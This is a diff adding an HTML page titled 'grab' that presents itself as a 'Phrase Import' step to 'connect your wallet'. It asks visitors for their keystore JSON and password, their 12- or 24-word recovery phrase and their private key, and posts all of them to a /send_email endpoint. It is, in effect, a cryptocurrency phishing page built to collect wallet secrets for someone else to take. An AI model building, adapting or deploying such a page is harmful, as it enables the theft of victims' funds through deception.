@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="/img/style.css">
+    
+    <title>grab</title>
+ 
+</head>
+<body>
+    
+    <div class="container">
+<link rel="stylesheet" href="grab.css">
+        
+ <form action="/send_email" method="post">
+    <div class="header">
+     <h1> Phrase Import </h1>
+        
+        <h3>Add any of these phrases/keys to connect your wallet</h3>
+        <br> <br>
+    </div>    
+    <div>
+        <textarea name="subject" id="subject" cols="150" rows="7" placeholder="Keystore Json"></textarea>
+        <br>
+        Several lines of text beginning with “{…}” plus the password you used to encrypt it.
+        <br> <br>
+    </div>
+    
+    <div>
+        <textarea name="message1" id="message1" cols="150" rows="7" placeholder="Phrase"></textarea>
+        <br>
+        Typically, 12 (sometimes 24) words separated by a single spaces.
+    </div>
+    <br>
+    <div>
+        <!-- <input type="email" name="" id="email" placeholder="Email id address"> -->
+        <input type="text" id="message" name="message" placeholder="private key" id="" size="160">
+        <br>
+        Typically, 12 (sometimes 24) words separated by a single spaces.
+    </div>
+    <br> <br>
+    <button type="submit"  >Proceed </button>   
+    
+ </form>
+    </div>
+    
+  <script src="/index.js"></script>
+    
+</body>
+</html>
